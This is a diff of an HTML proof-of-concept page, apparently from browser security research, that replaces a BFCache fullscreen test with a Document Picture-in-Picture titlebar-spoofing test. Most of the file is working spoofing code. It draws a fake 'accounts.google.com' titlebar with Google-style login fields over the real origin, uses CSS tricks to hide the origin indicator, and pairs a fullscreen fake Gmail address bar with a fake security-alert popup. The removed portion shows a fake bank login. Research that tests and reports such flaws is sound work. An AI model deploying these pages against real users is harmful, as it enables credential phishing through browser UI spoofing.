@@ -1,49 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 4: BFCache + Fullscreen State Persistence</title>
+<title>PoC 5: Document PiP Titlebar Occlusion</title>
 <!--
-  VH-2026-004: BFCache Fullscreen State Desynchronization
+  VH-2026-005: Document PiP Window Titlebar Crop/Occlusion
 
-  Target: Chromium 146+ (Desktop)
+  Target: Chromium 146+ (Desktop, macOS/Windows/Linux)
 
-  Technique: This PoC tests whether BFCache incorrectly preserves
-  fullscreen state across navigations, allowing an attacker's page
-  to display in fullscreen mode with a stale URL or no URL bar.
+  Technique: The Document PiP spec mandates showing the origin in
+  the window titlebar. But the spec only says user agents "should"
+  restrict size, and doesn't specify minimum visible area. This PoC
+  tests whether:
 
-  Attack chain:
-  1. Page A enters fullscreen and renders fake browser chrome
-  2. Page A navigates to Page B (cross-origin, e.g., bank.com)
-  3. Page A is stored in BFCache
-  4. User presses Back button
-  5. Page A is restored from BFCache
-  6. Test: Does fullscreen state persist? Does the URL bar show
-     the correct origin or is it stale from Page B?
+  1. The PiP window can be positioned so the titlebar is off-screen
+  2. The PiP content can render a fake titlebar over the real one
+  3. The PiP window can be resized so small that the origin is truncated
+  4. Multiple PiP windows can overlap to hide each other's titlebars
+  5. CSS transforms/animations can visually obscure the titlebar
 
-  Variants:
-  A) requestFullscreen -> navigate cross-origin -> back
-  B) requestFullscreen -> pushState -> navigate -> back -> back
-  C) requestFullscreen + PiP -> navigate -> back (double state restore)
-  D) requestFullscreen + pending permission -> navigate -> back
+  The PiP window is always-on-top, so if we can hide the origin
+  indicator, the user sees only attacker-controlled content floating
+  above everything else.
 -->
 </head>
 <body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">
 
-<h2>BFCache + Fullscreen State Persistence</h2>
-<p>Tests whether BFCache incorrectly preserves fullscreen/UI state.</p>
+<h2>Document PiP Titlebar Occlusion</h2>
+<p>Tests various methods to hide or obscure the PiP origin indicator.</p>
 
 <div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
-  <button onclick="testVariantA()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
-    A: Fullscreen + Navigate + Back
+  <button onclick="testFakeTitlebar()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
+    A: Fake Titlebar Overlay
   </button>
-  <button onclick="testVariantB()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
-    B: Fullscreen + History Stack + Back
+  <button onclick="testMinimumSize()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
+    B: Minimum Size Origin Truncation
   </button>
-  <button onclick="testVariantC()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
-    C: Fullscreen + PiP + Navigate + Back
+  <button onclick="testNegativeMargin()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
+    C: Negative Margin Titlebar Cover
   </button>
-  <button onclick="testVariantD()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
-    D: Fullscreen + Pending Dialog + Back
+  <button onclick="testMultiplePiP()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
+    D: Multiple PiP Overlap
+  </button>
+  <button onclick="testFullscreenPiP()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
+    E: Fullscreen + PiP Combination
   </button>
 </div>
 
@@ -52,216 +51,342 @@
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  if (el) el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+  el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+  el.scrollTop = el.scrollHeight;
 }
 
-// Check if we were restored from BFCache
-window.addEventListener('pageshow', (e) => {
-  if (e.persisted) {
-    log('PAGE RESTORED FROM BFCACHE!');
-    log('Fullscreen active: ' + !!document.fullscreenElement);
-    log('Document title: ' + document.title);
-    log('Location: ' + location.href);
-
-    // If we're still in fullscreen after BFCache restore, that's a finding
-    if (document.fullscreenElement) {
-      log('BUG: Fullscreen state persisted through BFCache!');
-      log('Attacker content is displayed in fullscreen');
-      log('CHECK: What does the URL bar show?');
-    }
-
-    // Try to re-enter fullscreen if not already
-    setTimeout(() => {
-      if (!document.fullscreenElement) {
-        log('Attempting to re-enter fullscreen...');
-        document.documentElement.requestFullscreen().then(() => {
-          log('Re-entered fullscreen without user gesture after BFCache restore!');
-        }).catch(e => {
-          log('Fullscreen re-entry failed (expected): ' + e.message);
-        });
-      }
-    }, 100);
-  }
-});
-
-// Also check via the newer API
-document.addEventListener('freeze', () => {
-  log('Page is being frozen (BFCache entry)');
-});
-
-document.addEventListener('resume', () => {
-  log('Page resumed (BFCache restore)');
-  log('Fullscreen: ' + !!document.fullscreenElement);
-});
-
-// Variant A: Basic fullscreen + navigate + back
-async function testVariantA() {
-  log('[A] Entering fullscreen...');
-
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[A] Fullscreen entered');
-  } catch(e) {
-    log('[A] Fullscreen failed: ' + e.message);
-    return;
-  }
-
-  // Render attacker content in fullscreen
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family: Arial; padding: 40px; max-width: 600px; margin: 0 auto;">
-      <h1 style="color: #1a73e8;">Fake Bank Login</h1>
-      <p>This content should NOT be visible after pressing Back.</p>
-      <p>If this page is shown in fullscreen after BFCache restore, it's a bug.</p>
-      <div style="border: 1px solid #ddd; padding: 20px; border-radius: 8px; margin-top: 20px;">
-        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;">
-        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;">
-        <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
-      </div>
-      <p style="color: #5f6368; margin-top: 20px;">
-        Navigating to example.com in 3 seconds...<br>
-        After it loads, press the Back button.<br>
-        Check if this page appears in fullscreen.
-      </p>
-    </div>
-  `;
-
-  // Navigate after delay (allows BFCache to store this page)
-  setTimeout(() => {
-    log('[A] Navigating to example.com...');
-    // Use location.href for a regular navigation (BFCache eligible)
-    location.href = 'https://example.com/';
-  }, 3000);
-}
-
-// Variant B: Build a history stack, enter fullscreen, navigate, back multiple times
-async function testVariantB() {
-  log('[B] Building history stack...');
-
-  // Create history entries
-  history.pushState({step: 1}, '', '?step=1');
-  history.pushState({step: 2}, '', '?step=2');
-  history.pushState({step: 3}, '', '?step=3');
-  log('[B] History stack: step=1, step=2, step=3');
-
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[B] Fullscreen entered at step=3');
-  } catch(e) {
-    log('[B] Fullscreen failed: ' + e.message);
-    return;
-  }
-
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family: Arial; padding: 40px;">
-      <h1>Step 3: Fullscreen Active</h1>
-      <p>History stack has 3 entries plus this fullscreen state.</p>
-      <p>Navigating to example.com in 3 seconds...</p>
-      <p>After loading, press Back TWICE to test BFCache + history interaction.</p>
-      <p>CHECK: Does fullscreen persist? Which URL shows in the address bar?</p>
-    </div>
-  `;
-
-  setTimeout(() => {
-    location.href = 'https://example.com/';
-  }, 3000);
-}
-
-// Variant C: Fullscreen + Document PiP + navigate + back
-// Tests if BOTH fullscreen and PiP state persist through BFCache
-async function testVariantC() {
-  log('[C] Testing fullscreen + PiP + BFCache...');
-
+function checkDocPiP() {
   if (!('documentPictureInPicture' in window)) {
-    log('[C] Document PiP not available');
-    return;
+    log('Document PiP API not available');
+    return false;
   }
+  return true;
+}
 
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[C] Fullscreen entered');
-  } catch(e) {
-    log('[C] Fullscreen failed: ' + e.message);
-    return;
-  }
+// Variant A: Render content that visually replaces the titlebar
+async function testFakeTitlebar() {
+  if (!checkDocPiP()) return;
+  log('[A] Opening PiP with fake titlebar...');
 
-  // Also open a PiP window
   try {
     const pipWindow = await documentPictureInPicture.requestWindow({
-      width: 300,
-      height: 200,
+      width: 380,
+      height: 260,
     });
+
+    // Style the body to extend into/over the titlebar area
+    pipWindow.document.documentElement.style.cssText = 'margin: 0; padding: 0;';
+    pipWindow.document.body.style.cssText = 'margin: 0; padding: 0; overflow: hidden;';
+
     pipWindow.document.body.innerHTML = `
-      <div style="font-family: Arial; padding: 20px;">
-        <h3>PiP Window</h3>
-        <p>This PiP was created while in fullscreen.</p>
-        <p>Does it persist after BFCache restore?</p>
+      <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* Try to extend content into the titlebar area */
+        .fake-titlebar {
+          position: fixed;
+          top: -40px; /* Try to overlap the real titlebar */
+          left: 0;
+          right: 0;
+          height: 80px;
+          background: #f0f0f0;
+          display: flex;
+          align-items: center;
+          padding: 40px 12px 0;
+          font-family: -apple-system, sans-serif;
+          font-size: 12px;
+          color: #333;
+          z-index: 999999;
+        }
+        .fake-titlebar .origin {
+          flex: 1;
+          text-align: center;
+          font-weight: 500;
+        }
+        .content {
+          padding: 20px;
+          padding-top: 50px;
+          font-family: -apple-system, sans-serif;
+        }
+      </style>
+
+      <!-- Fake titlebar showing a trusted origin -->
+      <div class="fake-titlebar">
+        <div style="display: flex; gap: 6px;">
+          <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
+          <div style="width: 12px; height: 12px; border-radius: 50%; background: #febc2e;"></div>
+          <div style="width: 12px; height: 12px; border-radius: 50%; background: #28c840;"></div>
+        </div>
+        <div class="origin">accounts.google.com</div>
+      </div>
+
+      <!-- Attacker content -->
+      <div class="content">
+        <h3 style="margin-bottom: 12px;">Google Account</h3>
+        <p style="color: #5f6368; margin-bottom: 16px;">Please verify your identity</p>
+        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:6px 0;border:1px solid #ccc;border-radius:4px;">
+        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:6px 0;border:1px solid #ccc;border-radius:4px;">
+        <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;margin-top:8px;">
+          Verify
+        </button>
       </div>
     `;
-    log('[C] PiP window opened');
+
+    log('[A] PiP opened with fake titlebar');
+    log('[A] CHECK: Does the fake titlebar overlap the real one?');
+    log('[A] CHECK: Can the user see the real origin indicator?');
+    log('[A] CHECK: Does position:fixed with negative top work in PiP?');
+
   } catch(e) {
-    log('[C] PiP failed: ' + e.message);
+    log('[A] Error: ' + e.message);
   }
-
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family: Arial; padding: 40px;">
-      <h1>Fullscreen + PiP Active</h1>
-      <p>Both fullscreen and PiP are active.</p>
-      <p>Navigating in 3 seconds. Press Back after.</p>
-      <p>CHECK: Do both fullscreen AND PiP persist after BFCache restore?</p>
-    </div>
-  `;
-
-  setTimeout(() => {
-    location.href = 'https://example.com/';
-  }, 3000);
 }
 
-// Variant D: Fullscreen + pending permission dialog + navigate + back
-// When user presses Back, does the permission dialog reappear?
-// If so, is it for the correct origin?
-async function testVariantD() {
-  log('[D] Testing fullscreen + pending permission + BFCache...');
+// Variant B: Test minimum window size to truncate origin
+async function testMinimumSize() {
+  if (!checkDocPiP()) return;
+  log('[B] Testing minimum PiP window sizes...');
+
+  const sizes = [
+    {w: 100, h: 100},
+    {w: 150, h: 100},
+    {w: 200, h: 100},
+    {w: 50, h: 50},
+    {w: 300, h: 50},
+  ];
+
+  for (const size of sizes) {
+    try {
+      const pipWindow = await documentPictureInPicture.requestWindow({
+        width: size.w,
+        height: size.h,
+      });
+
+      pipWindow.document.body.innerHTML = `
+        <div style="font-family: sans-serif; padding: 8px; font-size: 11px;">
+          <strong>Requested: ${size.w}x${size.h}</strong><br>
+          Actual: <span id="actual"></span>
+        </div>
+      `;
+
+      // Check actual size
+      setTimeout(() => {
+        try {
+          const actual = `${pipWindow.innerWidth}x${pipWindow.innerHeight}`;
+          pipWindow.document.getElementById('actual').textContent = actual;
+          log(`[B] Requested ${size.w}x${size.h}, Got: ${actual}`);
+        } catch(e) {}
+      }, 100);
+
+      // Close after a delay to open next one
+      await new Promise(r => setTimeout(r, 2000));
+      pipWindow.close();
+
+    } catch(e) {
+      log(`[B] Size ${size.w}x${size.h} failed: ${e.message}`);
+    }
+  }
+
+  log('[B] CHECK: What is the minimum enforced size?');
+  log('[B] CHECK: Is the origin fully visible at minimum size?');
+  log('[B] CHECK: Does the origin get truncated?');
+}
+
+// Variant C: Use negative margins/transforms to shift content over titlebar
+async function testNegativeMargin() {
+  if (!checkDocPiP()) return;
+  log('[C] Testing CSS tricks to cover titlebar...');
+
+  try {
+    const pipWindow = await documentPictureInPicture.requestWindow({
+      width: 360,
+      height: 240,
+    });
+
+    pipWindow.document.body.innerHTML = `
+      <style>
+        body { margin: 0; padding: 0; overflow: hidden; }
+
+        /* Method 1: Transform to move content up */
+        .method-transform {
+          transform: translateY(-30px);
+          position: relative;
+          z-index: 1000;
+        }
+
+        /* Method 2: Huge box-shadow to cover titlebar */
+        .shadow-cover {
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          height: 1px;
+          box-shadow: 0 -40px 0 40px #ffffff;
+          z-index: 999;
+        }
+
+        /* Method 3: Sticky element at top */
+        .sticky-cover {
+          position: sticky;
+          top: -30px;
+          background: white;
+          padding: 40px 20px 10px;
+          z-index: 100;
+          margin-top: -30px;
+        }
+      </style>
+
+      <!-- Try multiple CSS methods to cover the titlebar -->
+      <div class="shadow-cover"></div>
+
+      <div class="sticky-cover">
+        <strong style="font-family: sans-serif; font-size: 12px; color: #333;">
+          accounts.google.com
+        </strong>
+      </div>
+
+      <div style="padding: 0 20px 20px; font-family: sans-serif;">
+        <h3>Sign In</h3>
+        <input type="email" placeholder="Email" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <input type="password" placeholder="Password" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:8px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Continue</button>
+      </div>
+    `;
+
+    log('[C] PiP opened with CSS titlebar cover attempts');
+    log('[C] Methods: transform, box-shadow, sticky positioning');
+    log('[C] CHECK: Does any method visually cover the titlebar?');
+
+  } catch(e) {
+    log('[C] Error: ' + e.message);
+  }
+}
+
+// Variant D: Open multiple PiP windows, overlap them
+async function testMultiplePiP() {
+  if (!checkDocPiP()) return;
+  log('[D] Testing multiple PiP windows for overlap...');
+
+  // Note: Document PiP spec says only one PiP window at a time
+  // But let's test if we can open multiple
+  const windows = [];
+
+  for (let i = 0; i < 3; i++) {
+    try {
+      const pipWindow = await documentPictureInPicture.requestWindow({
+        width: 300 + (i * 20),
+        height: 200 + (i * 20),
+      });
+
+      pipWindow.document.body.innerHTML = `
+        <div style="font-family: sans-serif; padding: 20px; background: ${['#fff', '#f0f8ff', '#f5f5f5'][i]};">
+          <h3>PiP Window ${i + 1}</h3>
+          <p>Testing if multiple PiP windows can overlap.</p>
+          <p>Window ${i + 1} of 3</p>
+        </div>
+      `;
+
+      windows.push(pipWindow);
+      log(`[D] PiP window ${i + 1} opened`);
+      await new Promise(r => setTimeout(r, 500));
+
+    } catch(e) {
+      log(`[D] PiP window ${i + 1} failed: ${e.message}`);
+      log('[D] Only one PiP window allowed at a time (expected)');
+    }
+  }
+
+  if (windows.length > 1) {
+    log('[D] MULTIPLE PiP WINDOWS OPENED! Can they overlap?');
+    log('[D] CHECK: Can one PiP window cover another\'s titlebar?');
+  } else {
+    log('[D] Only 1 PiP window allowed. This blocks the overlap attack.');
+  }
+}
+
+// Variant E: Enter fullscreen, then open PiP
+// In fullscreen, the PiP floats above the fullscreen content
+// The fullscreen hides all browser chrome, and PiP has minimal chrome
+async function testFullscreenPiP() {
+  if (!checkDocPiP()) return;
+  log('[E] Testing fullscreen + PiP combination...');
 
   try {
     await document.documentElement.requestFullscreen();
-    log('[D] Fullscreen entered');
+    log('[E] Fullscreen entered');
   } catch(e) {
-    log('[D] Fullscreen failed: ' + e.message);
+    log('[E] Fullscreen failed: ' + e.message);
     return;
   }
 
-  // Trigger a permission prompt
-  navigator.geolocation.getCurrentPosition(
-    () => log('[D] Geolocation granted'),
-    () => log('[D] Geolocation denied')
-  );
-  log('[D] Permission prompt triggered');
-
+  // Render fake browser in fullscreen
   document.body.style.margin = '0';
   document.body.style.background = '#fff';
   document.body.innerHTML = `
-    <div style="font-family: Arial; padding: 40px;">
-      <h1>Fullscreen + Permission Pending</h1>
-      <p>A geolocation permission prompt should be visible.</p>
-      <p>Without dismissing the prompt, navigating in 5 seconds...</p>
-      <p>After example.com loads, press Back.</p>
-      <p>CHECK: Does the permission prompt reappear?</p>
-      <p>CHECK: Is the origin correct if it does?</p>
-      <p>CHECK: Is fullscreen still active?</p>
+    <div style="font-family: Arial; height: 100vh; display: flex; flex-direction: column;">
+      <!-- Fake browser chrome -->
+      <div style="background: #dee1e6; padding: 6px 12px; display: flex; align-items: center;">
+        <div style="flex: 1; background: #fff; border-radius: 20px; padding: 6px 16px; font-size: 14px; color: #5f6368;">
+          <span style="color: #1a73e8;">https://</span>mail.google.com/mail/u/0/#inbox
+        </div>
+      </div>
+      <!-- Fake email content -->
+      <div style="flex: 1; padding: 20px; background: #fff;">
+        <h2 style="color: #202124;">Primary</h2>
+        <div style="border-bottom: 1px solid #e0e0e0; padding: 12px 0; cursor: pointer;">
+          <strong>Google Security</strong> - Unusual sign-in activity on your account...
+        </div>
+        <div style="border-bottom: 1px solid #e0e0e0; padding: 12px 0; cursor: pointer;">
+          <strong>Google</strong> - Your Google Account password was changed...
+        </div>
+      </div>
     </div>
   `;
 
-  // Navigate while permission is still pending
-  setTimeout(() => {
-    log('[D] Navigating while permission is pending...');
-    location.href = 'https://example.com/';
-  }, 5000);
+  // Now open a PiP window with a fake security alert
+  setTimeout(async () => {
+    try {
+      const pipWindow = await documentPictureInPicture.requestWindow({
+        width: 380,
+        height: 200,
+      });
+
+      pipWindow.document.body.style.margin = '0';
+      pipWindow.document.body.innerHTML = `
+        <div style="font-family: -apple-system, sans-serif; padding: 20px; background: #fff;">
+          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 14px;">
+            <div style="width: 36px; height: 36px; background: #ea4335; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: bold; font-size: 20px;">!</div>
+            <div>
+              <div style="font-weight: 600; font-size: 14px;">Security Alert</div>
+              <div style="font-size: 12px; color: #5f6368;">Google Account Protection</div>
+            </div>
+          </div>
+          <p style="font-size: 13px; color: #3c4043; margin: 0 0 14px;">
+            Suspicious activity detected. Verify your identity to continue.
+          </p>
+          <button onclick="window.opener?.postMessage({type:'fullscreen-pip-click'},'*')"
+                  style="width: 100%; padding: 10px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;">
+            Verify Identity
+          </button>
+        </div>
+      `;
+
+      log('[E] PiP security alert opened in fullscreen');
+      log('[E] Fullscreen shows fake Gmail');
+      log('[E] PiP shows fake security alert');
+      log('[E] CHECK: Can user tell the PiP is from the attacker?');
+      log('[E] CHECK: Is the PiP titlebar clearly showing the real origin?');
+      log('[E] CHECK: Does the fullscreen + PiP combo hide all real browser chrome?');
+
+    } catch(e) {
+      log('[E] PiP in fullscreen failed: ' + e.message);
+    }
+  }, 1000);
+
+  window.addEventListener('message', (e) => {
+    if (e.data?.type === 'fullscreen-pip-click') {
+      log('[E] USER CLICKED FAKE SECURITY ALERT IN PIP');
+    }
+  });
 }
 </script>
 </body>
